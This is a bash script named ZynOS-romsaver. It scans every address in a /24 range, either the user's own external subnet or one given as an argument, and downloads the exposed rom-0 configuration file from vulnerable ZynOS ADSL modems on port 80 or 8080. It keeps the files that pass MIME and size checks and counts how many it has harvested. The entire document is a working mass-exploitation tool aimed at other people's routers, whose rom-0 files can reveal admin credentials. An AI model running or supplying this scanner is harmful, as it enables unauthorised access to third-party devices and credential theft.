#/bin/bash
#
# ZynOS-romsaver ~ collect vulnerable ADSL Modem's romfile
# Copyright (c) 2014 Ghozy Arif Fajri <gojigeje@gmail.com>
# License: The MIT License (MIT)
#

## ignore this, for my openwrt router
## need bash, wget, curl, file
# mkdir -p /root/script/romsaver
# cd /root/script/romsaver

start() {

  pausetime="10"
  tanggal=$(date +%Y-%m-%d_%H%M%S)
  mkdir -p "logs" "rom/$tanggal"
  echo "[Zynos-Romsaver] v0.1 by @gojigeje ~ started at $tanggal"
  echo "[Zynos-Romsaver] v0.1 by @gojigeje ~ started at $tanggal" >> "logs/$tanggal"

  # cek online first
  if eval "ping -c 1 8.8.4.4 -w 2 > /dev/null 2>&1"; then
    # online
    
    # cek online ip tok?
    if [[ ! -z "$2" ]]; then
      if [[ "$2" = "-o" || "$2" = "online" ]]; then
        online=true
      fi
      exit 1
    fi

    # tentukan ip target
    if [[ -z "$1" ]]; then
      # kosong, get external
      echo -n "- Getting external IP address.. "
      echo -n "- Getting external IP address.. " >> "logs/$tanggal"
      ip_curl=$(curl -s http://ipgue.ml/text | sed 's/\.[0-9]*$//')
      ip_wget=$(wget -q -O - http://ipgue.ml/text | sed 's/\.[0-9]*$//')
      echo "OK"
      echo "OK" >> "logs/$tanggal"
      
      # use non empty value
      if [[ ! -z "$ip_curl" ]]; then
        prefix="$ip_curl"
      else
        if [[ ! -z "$ip_wget" ]]; then
          prefix="$ip_wget"
        else
          echo "ERROR! - Cannot get my external IP address :("
            echo "ERROR! - Cannot get my external IP address :(" >> "logs/$tanggal"
          exit 1
        fi
      fi

    else
      # ada param ip, cek
      echo "- Checking.."
      if echo "$1" | egrep -E '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$' > /dev/null ;then
          VALID_IP_ADDRESS=$(echo $1 | awk -F'.' '$1 <=255 && $2 <= 255 && $3 <= 255 && $4 <= 255')
          if [ -z "$VALID_IP_ADDRESS" ]; then
            echo -e "\e[1;93mERROR: \e[0;93mThe IP address wasn't valid; octets must be less than 256!\e[0;39m"
            exit 1
          else
            prefix=$(echo $1 | sed 's/\.\.*$//;s/\.[0-9]*$//')
          fi
      else
        if echo "$1" | egrep -E '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$' > /dev/null ;then
          VALID_IP_ADDRESS=$(echo $1 | awk -F'.' '$1 <=255 && $2 <= 255 && $3 <= 255')
          if [ -z "$VALID_IP_ADDRESS" ]; then
            echo -e "\e[1;93mERROR: \e[0;93mThe IP address wasn't valid; octets must be less than 256!\e[0;39m"
            exit 1
          else
            prefix=$(echo $1 | sed 's/\.\.*$//')
          fi
        else
          echo -e "\e[1;93mERROR: \e[0;93mThe IP Address is malformed!\e[0;39m"
          exit
        fi
      fi

    fi

  else
    echo "ERROR! - Not online :("
      echo "ERROR! - Not online :(" >> "logs/$tanggal"
    exit 1
  fi
  echo "- Target Prefix: $prefix"
  echo "- Target Prefix: $prefix" >> "logs/$tanggal"
  echo "- Scanning target IP address: $prefix.1 - $prefix.255"
  echo "- Scanning target IP address: $prefix.1 - $prefix.255" >> "logs/$tanggal"
  echo "" 
  echo ""  >> "logs/$tanggal"
  
  # twit_mulai
  scan_range 2> /dev/null
  # twit_hasil
}

cekonline() {
  if eval "ping -c 1 8.8.4.4 -w 2 > /dev/null 2>&1"; then
    isonline="1"
  else
    isonline="0"
  fi

  if [[ $isonline -gt 0 ]]; then
    if [[ $paused -gt 0 ]]; then
      echo -e "\e[1;92m# OK Connected! \e[96m(Resuming scan..)\e[0;39m"
      echo "# OK Connected! (Resuming scan..)" >> "logs/$tanggal"
      paused="0"
    fi
  else
    if [[ $paused -gt 0 ]]; then
      sleep $pausetime
      cekonline
    else
      echo -e "\e[1;93m# WARNING: \e[0;93mCan't connect to internet! \e[96m(pausing untill connected..)\e[0;39m"
      echo "# WARNING: Can't connect to internet! (pausing untill connected..)" >> "logs/$tanggal"
      paused="1"
      cekonline
    fi
  fi
}

cekmime() {
  mime=$(file -b --mime-type "rom/$tanggal/$1")
  if [[ "$mime" = "application/octet-stream" ]]; then
    echo -e "\e[0;92mMimetype OK.. Rom Saved.. \e[0;39m"
    echo "Mimetype OK.. Rom Saved.." >> "logs/$tanggal"
  else
    echo -e "\e[31mFailed! -mimetype- wrong mimetype\e[0;39m"
    echo "Failed! -mimetype- wrong mimetype" >> "logs/$tanggal"
    rm "rom/$tanggal/$1"
  fi
}

ceksize() {
  sizes=$(find "rom/$tanggal/" -type f -size -7k | wc -l)
  find "rom/$tanggal/" -type f -size -7k -exec rm {} \;
  echo "Deleted $sizes broken rom file(s).." >> "logs/$tanggal"
  echo "" >> "logs/$tanggal"
  echo "Deleted $sizes broken rom file(s).."
  echo ""
}

countrom() {
  current=$(find "rom/$tanggal" -type f | wc -l)
  overall=$(find "rom/" -type f | wc -l)
  echo "$current new roms successfully saved.." >> "logs/$tanggal"
  echo "Now we have $overall roms in total :)" >> "logs/$tanggal"
  echo "" >> "logs/$tanggal"
  echo "$current new roms successfully saved.."
  echo "Now we have $overall roms in total :)"
  echo ""
}

scan_range() {
  i=1
  while [ $i -lt 256 ]; do
    
    iptarget="$prefix.$i"
    cekonline

    echo -n "$iptarget > "
    echo -n "$iptarget > " >> "logs/$tanggal"
    wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$iptarget/rom-0"
    EXIT_CODE=$?

    if [ $EXIT_CODE -gt 0 ];
      then
        # coba port 8080
        wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$iptarget:8080/rom-0"
        EXIT_CODE=$?

        if [ $EXIT_CODE -gt 0 ];
          then
            echo -e "\e[31mFailed! -not vulnerable?- \e[0;39m"
            echo "Failed! -not vulnerable?-" >> "logs/$tanggal"
        else
          wget -q "http://$iptarget:8080/rom-0" -O "rom/$tanggal/$iptarget" &
          PID=$!
          sleep $pausetime
          PSPID=$(ps | grep $PID | grep -v grep)
          if [ "$PSPID" != "" ]; then
            # macet
            kill $PID > /dev/null 2>&1
            echo -e "\e[31mFailed! -timeout- download 8080\e[0;39m"
            echo "Failed! -timeout- download 8080" >> "logs/$tanggal"
            rm "rom/$tanggal/$iptarget" > /dev/null 2>&1
          else
            # ok
            cekmime "$iptarget" "8080"
          fi
        fi

    else
      wget -q "http://$iptarget/rom-0" -O "rom/$tanggal/$iptarget" &
      PID=$!
      sleep $pausetime
      PSPID=$(ps | grep $PID | grep -v grep)
      if [ "$PSPID" != "" ]; then
        # macet
        kill $PID > /dev/null 2>&1
        echo -e "\e[31mFailed! -timeout- download 80\e[0;39m"
        echo "Failed! -timeout- download 80" >> "logs/$tanggal"
        rm "rom/$tanggal/$iptarget" > /dev/null 2>&11
      else
        # ok
        cekmime "$iptarget"
      fi

    fi

    let i=i+1
  done

  echo "" >> "logs/$tanggal"
  echo "Scan finished, checking for broken rom.." >> "logs/$tanggal"
  echo ""
  echo "Scan finished, checking for broken rom.."
  ceksize
  countrom
}

# twit_hasil() {

# }

start "$@"
